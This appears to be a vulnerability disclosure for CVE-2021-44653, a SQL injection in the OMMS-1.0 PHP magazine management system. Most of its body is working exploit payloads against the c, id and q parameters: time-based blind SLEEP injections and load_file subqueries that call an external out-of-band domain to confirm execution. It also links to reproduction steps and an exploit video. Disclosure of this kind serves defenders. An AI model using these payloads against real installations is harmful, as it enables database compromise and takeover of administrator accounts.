## [CVE-2021-44653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44653)

## [Software](https://www.sourcecodester.com/php/15061/online-magazine-management-system-php-free-source-code.html)

## [Vendor](https://www.sourcecodester.com/users/tips23)

![](https://github.com/nu11secur1ty/CVE-mitre/blob/main/CVE-2021-44653/Docs/Screenshot%202021-12-26%20210533.png)

## Description:
The  parameters `c`, `id` and `q` in /magazines/ node app from OMMS-1.0 appear to be vulnerable to Multiple SQL injection attacks. 
The payload '+(select load_file('\\\\vvuxyecn8v7q1d6md7ioocc5awgp4hu5l89zwqkf.nu11secur1tyPenetrationTestingEngineer.net\\riz'))+' was submitted in the c and in the other parameters. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
The attacker can take administrator account and other accounts of this vulnerable system.
Status: CRITICAL

[+] Payloads:

```mysql

---
Parameter: q (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=ogo8j6v2kn5215vfgll4qrnbct5zwgzlgb5'+(select load_file('\\\\xuvzxgbp7x6s0f5oc9hqneb79yfr3qrhu5lsbg0.nu11secur1tyPenetrationTestingEngineer.net\\fjb'))+'') AND (SELECT 4099 FROM (SELECT(SLEEP(3)))ItFP) AND ('RFqO'='RFqO
---

---
Parameter: c (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=categories&c=3'+(select load_file('\\\\vvuxyecn8v7q1d6md7ioocc5awgp4hu5l89zwqkf.nu11secur1tyPenetrationTestingEngineer.net\\riz'))+'' AND (SELECT 1579 FROM (SELECT(SLEEP(3)))OnzY) AND 'obZT'='obZT
---

---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=view_magazine&id=1'+(select load_file('\\\\t0uv3chldtco6bbki5nmtah3fuln9e9205owbnzc.nu11secur1tyPenetrationTestingEngineer.net\\mha'))+'' AND (SELECT 4930 FROM (SELECT(SLEEP(3)))uRCR) AND 'ZDnW'='ZDnW
---

```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-44653)

## Proof and Exploit:
[href](https://streamable.com/4qhwgz)
